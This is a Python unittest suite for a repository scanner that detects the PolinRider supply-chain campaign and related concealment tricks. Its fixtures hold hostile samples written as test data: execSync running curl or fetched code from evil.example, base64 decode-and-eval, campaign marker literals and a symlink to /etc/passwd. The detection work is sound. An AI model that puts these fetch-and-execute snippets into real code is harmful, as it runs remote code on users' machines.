#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import os
import re
import sys
import tempfile
import unittest
from datetime import date, timedelta
from pathlib import Path

SECURITY = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("scan_repo", SECURITY / "scan_repo.py")
scan_repo = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = scan_repo
assert spec.loader
spec.loader.exec_module(scan_repo)
POLICY = json.loads((SECURITY / "policy.defaults.json").read_text())
IOCS = json.loads((SECURITY / "polinrider_iocs.json").read_text())

# Unit tests pin "today" so that shipping an exception with a future expiry does not
# make unrelated assertions drift. Actual expiry is asserted separately, on the real
# calendar, by ShippedPolicyTests.
FIXED_TODAY = date(2026, 9, 2)


def write(root: Path, rel: str, content: str | bytes) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, bytes):
        p.write_bytes(content)
    else:
        p.write_text(content, encoding="utf-8")
    return p


def rules(findings):
    return {f.rule for f in findings}


def by_rule(findings, rule):
    return [f for f in findings if f.rule == rule]


def blocking(findings, policy=POLICY):
    blockers = set(policy.get("block_severities", ["critical", "high"]))
    return [f for f in findings if f.severity in blockers]


class ScannerRegressionTests(unittest.TestCase):
    def scan(self, root: Path, base: Path | None = None, reviewed: bool = False, policy: dict | None = None,
             today: date | None = None):
        return scan_repo.scan_repository(root, policy or POLICY, IOCS, base, reviewed, today or FIXED_TODAY)

    # --- baseline behaviour -------------------------------------------------

    def test_clean_source_passes(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/index.ts", "export const add = (a:number,b:number) => a+b;\n")
            write(root, ".github/workflows/ci.yml", "jobs:\n  x:\n    steps:\n      - uses: actions/checkout@" + "a" * 40 + "\n")
            self.assertFalse(blocking(self.scan(root)))

    def test_current_polinrider_marker_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "next.config.js", "global['!']='4-1928';\n")
            self.assertIn("POLINRIDER_IOC", rules(self.scan(root)))

    def test_older_polinrider_marker_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "app.ts", "global['!']='8-1638-2';\n")
            self.assertIn("POLINRIDER_IOC", rules(self.scan(root)))

    def test_fake_woff2_javascript_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/fonts/app.woff2", b"const x=require('child_process'); x.exec('id');")
            self.assertIn("FAKE_FONT", rules(self.scan(root)))

    def test_real_font_magic_bytes_pass(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/fonts/real.woff2", b"wOF2" + b"\x00" * 512)
            self.assertNotIn("FAKE_FONT", rules(self.scan(root)))

    def test_vscode_folder_open_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".vscode/tasks.json", '{"version":"2.0.0","tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"node x.js"}]}')
            self.assertIn("VSCODE_AUTORUN", rules(self.scan(root)))

    def test_hidden_whitespace_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "server.ts", "const ok=1;" + (" " * 200) + "eval('x');\n")
            self.assertIn("HIDDEN_WHITESPACE", rules(self.scan(root)))

    def test_decode_and_eval_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/index.js", "eval(Buffer.from(payload, 'base64').toString());\n")
            self.assertIn("DECODE_AND_EXECUTE", rules(self.scan(root)))

    def test_sql_template_injection_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/db.ts", "await db.query(`SELECT * FROM users WHERE id=${req.params.id}`);\n")
            self.assertIn("POSSIBLE_SQL_INJECTION", rules(self.scan(root)))

    def test_unpinned_action_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".github/workflows/ci.yml", "jobs:\n  x:\n    steps:\n      - uses: actions/checkout@v7\n")
            self.assertIn("UNPINNED_ACTION", rules(self.scan(root)))

    def test_composite_action_manifest_requires_pinned_sha(self):
        """Composite actions execute in CI too, so their `uses:` refs must be pinned."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".github/actions/setup/action.yml",
                  "runs:\n  using: composite\n  steps:\n    - uses: actions/setup-node@v4\n")
            self.assertIn("UNPINNED_ACTION", rules(self.scan(root)))

    def test_known_bad_package_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "package.json", json.dumps({"dependencies": {"tailwindcss-style-animate": "1.0.0"}}))
            self.assertIn("KNOWN_MALICIOUS_PACKAGE", rules(self.scan(root)))

    def test_poisoned_npm_lock_url_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/x": {"version": "1.0.0", "resolved": "https://evil.example/x.tgz", "integrity": "sha512-abc"}}}
            write(root, "package-lock.json", json.dumps(lock))
            self.assertIn("LOCKFILE_REMOTE_ARTIFACT", rules(self.scan(root)))

    def test_missing_npm_lock_integrity_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/x": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/x/-/x-1.0.0.tgz"}}}
            write(root, "package-lock.json", json.dumps(lock))
            self.assertIn("LOCKFILE_MISSING_INTEGRITY", rules(self.scan(root)))

    def test_custom_registry_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".npmrc", "registry=https://packages.evil.example/\n")
            self.assertIn("CUSTOM_NPM_REGISTRY", rules(self.scan(root)))

    def test_yarn_plugin_execution_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".yarnrc.yml", "plugins:\n  - path: .yarn/plugins/evil.cjs\n")
            self.assertIn("YARN_EXEC_PLUGIN", rules(self.scan(root)))

    @unittest.skipIf(os.name == "nt", "symlink semantics differ on Windows")
    def test_symlink_blocks_before_following(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            os.symlink("/etc/passwd", root / "not-source.txt")
            self.assertIn("SYMLINK", rules(self.scan(root)))

    def test_security_control_change_requires_review(self):
        with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b:
            base, candidate = Path(a), Path(b)
            write(base, "security/policy.json", "{}")
            write(candidate, "security/policy.json", '{"weakened":true}')
            self.assertIn("SECURITY_CONTROL_CHANGE", rules(self.scan(candidate, base, reviewed=False)))

    def test_review_does_not_suppress_actual_malware(self):
        with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b:
            base, candidate = Path(a), Path(b)
            write(base, "security/policy.json", "{}")
            write(candidate, "security/policy.json", "{}")
            write(candidate, "app.js", "global['_V']='A4-1928';")
            self.assertIn("POLINRIDER_IOC", rules(self.scan(candidate, base, reviewed=True)))


class FalsePositiveRegressionTests(unittest.TestCase):
    """The gate is only useful if it stays green on ordinary, correct code."""

    def scan(self, root: Path, policy: dict | None = None):
        return scan_repo.scan_repository(root, policy or POLICY, IOCS, None, False, FIXED_TODAY)

    def test_regexp_exec_beside_a_url_is_not_a_network_process_chain(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "app.ts",
                  'const RE = /^(\\w+)-(\\d+)$/;\n'
                  'const API = "https://api.example.com/v1/items";\n'
                  'export const parse = (s: string) => RE.exec(s) ? API : null;\n')
            found = rules(self.scan(root))
            self.assertNotIn("NETWORK_PROCESS_CHAIN", found)
            self.assertNotIn("CONFIG_PROCESS_EXEC", found)

    def test_url_constant_alone_is_not_a_download(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "config.ts", 'export const DOCS = "https://docs.example.com/guide";\n')
            self.assertFalse(blocking(self.scan(root)))

    def test_real_child_process_plus_network_still_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "app.ts",
                  "import { execSync } from 'node:child_process';\n"
                  "const r = await fetch('https://evil.example/p');\n"
                  "execSync(await r.text());\n")
            self.assertIn("NETWORK_PROCESS_CHAIN", rules(self.scan(root)))

    def test_child_process_with_curl_is_critical(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "app.ts",
                  "const cp = require('child_process');\n"
                  "cp.execSync('curl https://evil.example/x -o /tmp/x');\n")
            hits = by_rule(self.scan(root), "NETWORK_PROCESS_CHAIN")
            self.assertTrue(hits)
            self.assertEqual("critical", hits[0].severity)

    def test_yarn_registry_host_is_allowed_by_default(self):
        """registry.yarnpkg.com is where every Yarn Classic lockfile resolves."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "yarn.lock",
                  '# yarn lockfile v1\n\n"@alloc/quick-lru@^5.2.0":\n  version "5.2.0"\n'
                  '  resolved "https://registry.yarnpkg.com/@alloc/quick-lru/-/quick-lru-5.2.0.tgz#abc"\n')
            self.assertNotIn("LOCKFILE_REMOTE_ARTIFACT", rules(self.scan(root)))

    def test_unapproved_lockfile_host_is_reported_once_per_host(self):
        """A single wrong registry must not emit thousands of identical findings."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            entries = "".join(
                f'"pkg{i}@^1.0.0":\n  version "1.0.0"\n  resolved "https://evil.example/pkg{i}.tgz"\n\n'
                for i in range(50)
            )
            write(root, "yarn.lock", "# yarn lockfile v1\n\n" + entries)
            hits = by_rule(self.scan(root), "LOCKFILE_REMOTE_ARTIFACT")
            self.assertEqual(1, len(hits))
            self.assertIn("evil.example", hits[0].message)

    def test_console_severity_is_policy_driven(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/index.js", "console.log('debug');\n")
            hits = by_rule(self.scan(root), "CONSOLE_CALL")
            self.assertTrue(hits, "console use should still be reported")
            self.assertEqual(POLICY["console_severity"], hits[0].severity)
            self.assertFalse(blocking(self.scan(root)), "console hygiene must not block the merge gate")

    def test_console_exempt_globs_apply(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "tests/thing.test.ts", "console.log('expected output');\n")
            write(root, "scripts/tool.ts", "console.info('progress');\n")
            self.assertNotIn("CONSOLE_CALL", rules(self.scan(root)))

    def test_generic_marker_is_context_not_a_hard_block(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "scripts/release.js", "const LAST_COMMIT_DATE = process.env.LAST_COMMIT_DATE;\n")
            found = self.scan(root)
            self.assertNotIn("POLINRIDER_IOC", rules(found))
            self.assertIn("POLINRIDER_CONTEXT", rules(found))
            self.assertFalse(blocking(found))

    def test_nested_yarn_cache_is_skipped(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "apps/web/.yarn/cache/evil.js", "global['!']='4-1928';\n")
            self.assertFalse(self.scan(root))


class ExceptionTests(unittest.TestCase):
    def policy(self, exceptions):
        p = dict(POLICY)
        p["exceptions"] = exceptions
        return p

    def scan(self, root: Path, policy: dict, today: date | None = None):
        return scan_repo.scan_repository(root, policy, IOCS, None, False, today or FIXED_TODAY)

    def eval_file(self, root: Path):
        write(root, "app/feature/_eval.ts", "export const run = (s: string) => eval(s);\n")

    def test_valid_exception_downgrades_but_keeps_the_finding_visible(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            self.eval_file(root)
            policy = self.policy([{
                "rule": "DYNAMIC_CODE_EXECUTION",
                "paths": ["app/feature/_eval.ts"],
                "reason": "Reviewed sandboxed evaluator, tracked for replacement.",
                "expires": "2027-03-01",
            }])
            found = self.scan(root, policy)
            hits = by_rule(found, "DYNAMIC_CODE_EXECUTION")
            self.assertTrue(hits)
            self.assertEqual("info", hits[0].severity)
            self.assertTrue(hits[0].exempted)
            self.assertIn("accepted exception", hits[0].message)
            self.assertFalse(blocking(found, policy))

    def test_exception_does_not_apply_to_other_paths(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            self.eval_file(root)
            write(root, "app/other/thing.ts", "export const run = (s: string) => eval(s);\n")
            policy = self.policy([{
                "rule": "DYNAMIC_CODE_EXECUTION",
                "paths": ["app/feature/_eval.ts"],
                "reason": "Reviewed sandboxed evaluator, tracked for replacement.",
                "expires": "2027-03-01",
            }])
            found = blocking(self.scan(root, policy), policy)
            self.assertEqual(["app/other/thing.ts"], [f.path for f in found])

    def test_expired_exception_blocks_and_is_reported(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            self.eval_file(root)
            policy = self.policy([{
                "rule": "DYNAMIC_CODE_EXECUTION",
                "paths": ["app/feature/_eval.ts"],
                "reason": "Reviewed sandboxed evaluator, tracked for replacement.",
                "expires": (FIXED_TODAY - timedelta(days=1)).isoformat(),
            }])
            found = self.scan(root, policy)
            self.assertIn("EXCEPTION_EXPIRED", rules(found))
            hits = by_rule(found, "DYNAMIC_CODE_EXECUTION")
            self.assertEqual("high", hits[0].severity, "expired exception must stop suppressing")

    def test_exception_without_reason_or_expiry_is_invalid(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            self.eval_file(root)
            for bad in (
                {"rule": "DYNAMIC_CODE_EXECUTION", "paths": ["app/feature/_eval.ts"], "reason": "ok reason here", },
                {"rule": "DYNAMIC_CODE_EXECUTION", "paths": ["app/feature/_eval.ts"], "reason": "short", "expires": "2027-03-01"},
                {"rule": "DYNAMIC_CODE_EXECUTION", "paths": [], "reason": "a long enough reason", "expires": "2027-03-01"},
                {"paths": ["x"], "reason": "a long enough reason", "expires": "2027-03-01"},
            ):
                with self.subTest(bad=bad):
                    found = self.scan(root, self.policy([bad]))
                    self.assertIn("EXCEPTION_INVALID", rules(found))

    def test_non_exemptible_rules_cannot_be_silenced(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "app.js", "global['_V']='A4-1928';\n")
            policy = self.policy([{
                "rule": "POLINRIDER_IOC",
                "paths": ["**"],
                "reason": "Attempting to silence a compromise indicator.",
                "expires": "2027-03-01",
            }])
            found = self.scan(root, policy)
            self.assertIn("EXCEPTION_INVALID", rules(found))
            hits = by_rule(found, "POLINRIDER_IOC")
            self.assertEqual("critical", hits[0].severity)


class CommittedBuildArtifactTests(unittest.TestCase):
    """This repository commits `build/` on its deployment branches and pulls it onto
    servers. That output is code that reaches production, produced on a developer
    workstation, so it must be scanned - but with a reduced profile, because minified
    bundles legitimately trip every generic heuristic.
    """

    # Shapes taken from the real committed bundle: a giant single line, a bundler eval,
    # base64 data, and react-syntax-highlighter's shell grammar listing every command.
    MINIFIED = (
        "(self.webpackChunk=self.webpackChunk||[]).push([[1],{"
        + "a:" + "0" * 30000 + ","
        + "b:function(e){return eval(e)},"
        + "c:'data:image/png;base64," + "QUJD" * 60 + "',"
        + "d:/^(?:cksum|clear|cmp|curl|cut|date|dd|wget|whereis|which|who)$/,"
        + "e:function(){console.log(1)}}]);\n"
    )

    def policy(self, enabled=True, globs=("build/**",)):
        p = dict(POLICY)
        p["scan_build_artifacts"] = enabled
        p["artifact_globs"] = list(globs)
        return p

    def scan(self, root: Path, policy=None):
        return scan_repo.scan_repository(root, policy or self.policy(), IOCS, None, False, FIXED_TODAY)

    def test_real_shaped_bundle_output_does_not_block(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "build/static/chunks/main-abc123.js", self.MINIFIED)
            write(root, "build/server/chunks/8010.js", self.MINIFIED)
            found = self.scan(root)
            self.assertEqual([], blocking(found),
                             f"minified bundles must not block: {[f.rule for f in blocking(found)]}")

    def test_campaign_signature_inside_a_bundle_blocks(self):
        for payload, rule in (
            ("global.o='7-2231-9';", "POLINRIDER_GLOBAL_TAG"),
            ("var _$_9c3a=['x'];", "OBFUSCATED_IDENTIFIER"),
            ("global['!']='4-1928';", "POLINRIDER_IOC"),
        ):
            with self.subTest(rule=rule), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, "build/static/chunks/main-abc123.js", self.MINIFIED + payload)
                self.assertIn(rule, rules(self.scan(root)))

    def test_build_output_is_walked_only_when_enabled(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "build/static/chunks/x.js", "global.o='7-2231-9';\n")
            self.assertIn("POLINRIDER_GLOBAL_TAG", rules(self.scan(root, self.policy(True))))
            self.assertEqual([], self.scan(root, self.policy(False)),
                             "artifacts must stay skipped when the option is off")

    def test_source_outside_the_artifact_globs_keeps_the_full_profile(self):
        """Turning on artifact scanning must not weaken scanning of real source."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "build/static/chunks/x.js", self.MINIFIED)
            write(root, "src/thing.ts", "export const a=1;" + " " * 300 + "eval(atob(p));")
            found = rules(self.scan(root))
            self.assertIn("HIDDEN_WHITESPACE", found)
            self.assertIn("DECODE_AND_EXECUTE", found)

    def test_binary_asset_inside_build_output_is_still_checked(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "build/static/media/logo.png", b"require('child_process');")
            self.assertTrue(blocking(self.scan(root)))


class ConcealmentIndependentTests(unittest.TestCase):
    """Detection that does not depend on the concealment technique.

    HIDDEN_WHITESPACE only fires above a fixed padding run, and POLINRIDER_IOC only fires
    on a known literal. A variant that pads with 50 spaces and uses an unpublished marker
    would defeat both, so length anomaly is measured independently.
    """

    def scan(self, root: Path):
        return scan_repo.scan_repository(root, POLICY, IOCS, None, False, FIXED_TODAY)

    def test_config_append_blocks_at_any_padding_length(self):
        for pad in (0, 10, 60, 119, 300):
            with self.subTest(padding=pad), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, "postcss.config.mjs",
                      "export default {plugins:{tailwindcss:{}}};" + " " * pad + "z" * 3000 + ";")
                found = rules(self.scan(root))
                self.assertIn("CONFIG_LINE_ANOMALY", found,
                              f"append with {pad} spaces of padding was not detected")

    def test_clean_configs_from_this_project_pass(self):
        """Across all 85 branches the longest real config line is 103 characters."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "next.config.mjs",
                  "import { PHASE_DEVELOPMENT_SERVER } from 'next/dist/shared/lib/constants.js';\n"
                  "export default (phase) => ({ distDir: phase === PHASE_DEVELOPMENT_SERVER ? undefined : 'build' });\n")
            write(root, "postcss.config.mjs", "export default { plugins: { tailwindcss: {} } };\n")
            write(root, "tailwind.config.ts", "import type { Config } from 'tailwindcss';\nexport default {} satisfies Config;\n")
            self.assertEqual([], blocking(self.scan(root)))

    def test_reported_config_targets_are_all_recognised(self):
        """Filename lists rot. Every target named in the two community discussions must match."""
        for name in ("postcss.config.mjs", "postcss.config.js", "next.config.js", "next.config.mjs",
                     "next.config.ts", "tailwind.config.js", "tailwind.config.mjs", "eslint.config.mjs",
                     "vite.config.js", "vite.config.mjs", "vue.config.js", "astro.config.mjs",
                     "webpack.config.js", "jest.config.js", "drizzle.config.ts"):
            with self.subTest(name=name):
                self.assertTrue(scan_repo.is_config_file(Path(name)), f"{name} not recognised as a config")
        for name in ("App.js", "main.ts", "index.js", "server.ts", "middleware.ts"):
            with self.subTest(name=name):
                self.assertTrue(scan_repo.is_entrypoint_file(Path(name)), f"{name} not recognised as an entry point")

    def test_ordinary_files_are_not_treated_as_configs(self):
        for name in ("components/Button.tsx", "lib/utils.ts", "config.ts", "my.config.js", "app/page.tsx"):
            with self.subTest(name=name):
                self.assertFalse(scan_repo.is_config_file(Path(name)))

    def test_wildcard_cors_with_credential_headers_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "server/api.ts",
                  "export const headers = [\n"
                  "  { key: 'Access-Control-Allow-Origin', value: '*' },\n"
                  "  { key: 'Access-Control-Allow-Headers', value: 'Content-Type, Authorization' },\n"
                  "];\n")
            hits = by_rule(self.scan(root), "PERMISSIVE_CORS")
            self.assertTrue(hits)
            self.assertEqual("high", hits[0].severity)

    def test_explicit_cors_origin_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "server/api.ts",
                  "export const headers = [{ key: 'Access-Control-Allow-Origin', value: 'https://app.neotree.org' }];\n")
            self.assertNotIn("PERMISSIVE_CORS", rules(self.scan(root)))

    def test_invisible_characters_block(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/auth.ts", "export const admin\u200b = false;\nif (admin) grant();\n")
            hits = by_rule(self.scan(root), "INVISIBLE_CHARACTER")
            self.assertTrue(hits)
            self.assertEqual("high", hits[0].severity)

    def test_byte_order_mark_at_start_of_file_is_allowed(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/ok.ts", "\ufeffexport const ok = 1;\n")
            self.assertNotIn("INVISIBLE_CHARACTER", rules(self.scan(root)))

    def test_emoji_zero_width_joiner_is_advisory_only(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/emoji.ts", "export const fam = '\U0001F468\u200d\U0001F469\u200d\U0001F467';\n")
            found = self.scan(root)
            self.assertIn("INVISIBLE_CHARACTER", rules(found))
            self.assertEqual([], blocking(found), "legitimate emoji sequences must not block")

    def test_homoglyph_identifier_is_reported(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/user.ts", "const \u0430dmin = getUser();\nexport default \u0430dmin;\n")
            self.assertIn("MIXED_SCRIPT_IDENTIFIER", rules(self.scan(root)))

    def test_plain_ascii_source_has_no_unicode_findings(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/clean.ts", "export const add = (a: number, b: number) => a + b;\n")
            found = rules(self.scan(root))
            self.assertNotIn("INVISIBLE_CHARACTER", found)
            self.assertNotIn("MIXED_SCRIPT_IDENTIFIER", found)
            self.assertNotIn("BIDI_CONTROL", found)


class CodeOwnersTests(unittest.TestCase):
    """CODEOWNERS fails open: GitHub ignores an entry naming a team that does not exist or
    has no repo access, with no error surfaced anywhere. The gate blocks changes to
    security controls, but Code Owner review is what makes that block meaningful."""

    def scan(self, root: Path):
        return scan_repo.scan_repository(root, POLICY, IOCS, None, False, FIXED_TODAY)

    GOOD = ("*                    @neotree/core-devs\n"
            "/security/           @neotree/core-devs @neotree/maintainers\n"
            "/.github/workflows/  @neotree/core-devs @neotree/maintainers\n")

    def root_with(self, td, codeowners: str | None):
        root = Path(td)
        write(root, "package.json", "{}")
        write(root, ".github/workflows/ci.yml", "on: push\n")
        if codeowners is not None:
            write(root, ".github/CODEOWNERS", codeowners)
        return root

    def test_valid_codeowners_passes(self):
        with tempfile.TemporaryDirectory() as td:
            root = self.root_with(td, self.GOOD)
            self.assertEqual([], blocking(self.scan(root)))

    def test_missing_codeowners_is_reported(self):
        with tempfile.TemporaryDirectory() as td:
            root = self.root_with(td, None)
            self.assertIn("CODEOWNERS_MISSING", rules(self.scan(root)))

    def test_placeholder_owner_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = self.root_with(td,
                  "/security/           @YOUR_GITHUB_SECURITY_OWNER\n"
                  "/.github/workflows/  @YOUR_GITHUB_SECURITY_OWNER\n")
            hits = by_rule(self.scan(root), "CODEOWNERS_PLACEHOLDER")
            self.assertTrue(hits)
            self.assertEqual("critical", hits[0].severity)

    def test_dropping_a_protected_path_is_reported(self):
        """Removing the /security/ line would leave the gate's own controls unreviewed."""
        with tempfile.TemporaryDirectory() as td:
            root = self.root_with(td, "*  @neotree/core-devs\n")
            write(root, "security/policy.json", "{}")
            hits = by_rule(self.scan(root), "CODEOWNERS_COVERAGE")
            self.assertEqual(len(scan_repo.CODEOWNERS_REQUIRED_PATHS), len(hits))

    def test_coverage_is_not_required_for_paths_that_do_not_exist(self):
        """A branch without a security/ directory needs no owner entry for it."""
        with tempfile.TemporaryDirectory() as td:
            root = self.root_with(td, "*  @neotree/core-devs\n")
            hits = [h for h in by_rule(self.scan(root), "CODEOWNERS_COVERAGE") if "/security/" in h.message]
            self.assertEqual([], hits)

    def test_branch_predating_the_pipeline_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "package.json", "{}")
            write(root, ".github/ISSUE_TEMPLATE/bug.md", "---\nname: bug\n---\n")
            self.assertNotIn("CODEOWNERS_MISSING", rules(self.scan(root)))

    def test_wildcard_alone_does_not_satisfy_coverage(self):
        with tempfile.TemporaryDirectory() as td:
            root = self.root_with(td, "*  @neotree/core-devs\n")
            write(root, "security/policy.json", "{}")
            self.assertIn("CODEOWNERS_COVERAGE", rules(self.scan(root)))

    def test_comments_are_not_parsed_as_rules(self):
        with tempfile.TemporaryDirectory() as td:
            root = self.root_with(td, "# example: /x/ @YOUR_TEAM_HERE\n" + self.GOOD)
            self.assertNotIn("CODEOWNERS_PLACEHOLDER", rules(self.scan(root)))


class ShippedCodeOwnersTests(unittest.TestCase):
    def test_codeowners_names_only_real_teams(self):
        text = (SECURITY.parent / ".github" / "CODEOWNERS").read_text(encoding="utf-8")
        owners = {o for line in text.splitlines()
                  for o in line.split("#", 1)[0].split()[1:] if line.split("#", 1)[0].strip()}
        self.assertTrue(owners)
        # Only teams with write access to this repository may be named. @neotree/maintainers
        # is scoped to org-governance repos and has no access here, so GitHub would reject it.
        self.assertEqual(set(), owners - {"@neotree/core-devs"})

    def test_every_protected_path_has_an_owner(self):
        """The invariant that matters is that a pull-request author is never the only
        person who could approve their own change. With a single owning team that is a
        property of TEAM MEMBERSHIP, which CI cannot see - @neotree/core-devs has three
        members, so any author leaves two possible reviewers. Listing a second team is
        only safe when that team actually has write access to the repository; GitHub
        rejects an entry whose team does not, which is what this project hit in practice.
        """
        text = (SECURITY.parent / ".github" / "CODEOWNERS").read_text(encoding="utf-8")
        rules = [l.split("#", 1)[0].strip() for l in text.splitlines()]
        rules = [r for r in rules if r]
        self.assertTrue(rules, "CODEOWNERS has no active rules")
        for rule in rules:
            self.assertGreaterEqual(len(rule.split()) - 1, 1, f"{rule.split()[0]} has no owner")


class TraversalSafetyTests(unittest.TestCase):
    @unittest.skipIf(os.name == "nt", "symlink semantics differ on Windows")
    def test_sensitive_changes_does_not_follow_symlink_cycles(self):
        """The privileged gate walks hostile trees; a symlink loop must not hang it."""
        with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b:
            base, candidate = Path(a), Path(b)
            write(base, "security/policy.json", "{}")
            write(candidate, "security/policy.json", "{}")
            (candidate / "loop").mkdir()
            os.symlink("..", candidate / "loop" / "self")
            self.assertEqual([], scan_repo.sensitive_changes(candidate, base))

    def test_glob_translation_respects_path_separators(self):
        match = lambda pat, s: bool(scan_repo.glob_to_regex(pat).match(s))
        self.assertTrue(match("tests/**", "tests/a/b.ts"))
        self.assertTrue(match("**/*.test.ts", "a/b/c.test.ts"))
        self.assertTrue(match("**/*.test.ts", "c.test.ts"))
        self.assertTrue(match("lib/logger.ts", "lib/logger.ts"))
        self.assertFalse(match("lib/*.ts", "lib/nested/deep.ts"))
        self.assertFalse(match("tests/**", "src/tests/a.ts"))
        # Glob metacharacters in real paths (e.g. Next.js route groups) stay literal.
        self.assertTrue(match("app/(ops)/x/_eval.ts", "app/(ops)/x/_eval.ts"))


class ShippedPolicyTests(unittest.TestCase):
    """Assertions about the defaults this shared pipeline ships to every repository."""

    def test_defaults_carry_no_repository_specific_exceptions(self):
        """An exception is an accepted risk in ONE repository. Shipping one centrally would
        silently apply another team's risk acceptance to six codebases."""
        self.assertEqual([], POLICY.get("exceptions", []))

    def test_defaults_block_critical_and_high(self):
        self.assertEqual({"critical", "high"}, set(POLICY["block_severities"]))

    def test_defaults_allow_both_public_registries(self):
        self.assertIn("registry.npmjs.org", POLICY["allowed_npm_registries"])
        self.assertIn("registry.yarnpkg.com", POLICY["allowed_npm_registries"])

    def test_console_is_not_a_merge_blocker(self):
        self.assertNotIn(POLICY["console_severity"], POLICY["block_severities"])

    def test_scanner_source_embeds_no_indicator_literals(self):
        """The scanner is itself IOC-scanned, so an indicator in its source makes it flag
        itself. Indicator literals belong in polinrider_iocs.json."""
        src = (SECURITY / "scan_repo.py").read_text(encoding="utf-8")
        embedded = [m for m in IOCS["markers"] if m in src]
        self.assertEqual([], embedded, f"indicator literals leaked into scan_repo.py: {embedded}")

    def test_shipped_repository_scan_has_no_blocking_findings(self):
        """Guards against a rule change that makes this repository itself unmergeable."""
        findings = scan_repo.scan_repository(SECURITY.parent, POLICY, IOCS, None, False, FIXED_TODAY)
        self.assertEqual([], [f"{f.rule} {f.path}:{f.line}" for f in blocking(findings)])

    def test_shipped_exceptions_are_valid_and_unexpired(self):
        findings: list = []
        usable = scan_repo.validate_exceptions(POLICY, findings, date.today())
        self.assertEqual(
            [], [f.rule for f in findings],
            "security/policy.json has an invalid or EXPIRED exception. This is the intended "
            "review trigger: re-review the risk, then renew or remove the entry.",
        )
        self.assertEqual(len(POLICY.get("exceptions", [])), len(usable))

class PolicyOverlayTests(unittest.TestCase):
    """A repository may tighten the shared gate. It may never loosen it."""

    def test_overlay_adds_repository_specific_exceptions(self):
        merged, findings = scan_repo.merge_policy(POLICY, {"exceptions": [
            {"rule": "DYNAMIC_CODE_EXECUTION", "paths": ["app.ts"],
             "reason": "Reviewed evaluator for this repository only.", "expires": "2027-03-01"}]})
        self.assertEqual([], findings)
        self.assertEqual(1, len(merged["exceptions"]))

    def test_overlay_cannot_remove_a_blocking_severity(self):
        merged, findings = scan_repo.merge_policy(POLICY, {"block_severities": ["critical"]})
        self.assertIn("POLICY_OVERLAY_WEAKENED", {f.rule for f in findings})
        self.assertEqual("critical", findings[0].severity)
        self.assertEqual({"critical", "high"}, set(merged["block_severities"]))

    def test_overlay_cannot_disable_blocking_entirely(self):
        merged, findings = scan_repo.merge_policy(POLICY, {"block_severities": []})
        self.assertIn("POLICY_OVERLAY_WEAKENED", {f.rule for f in findings})
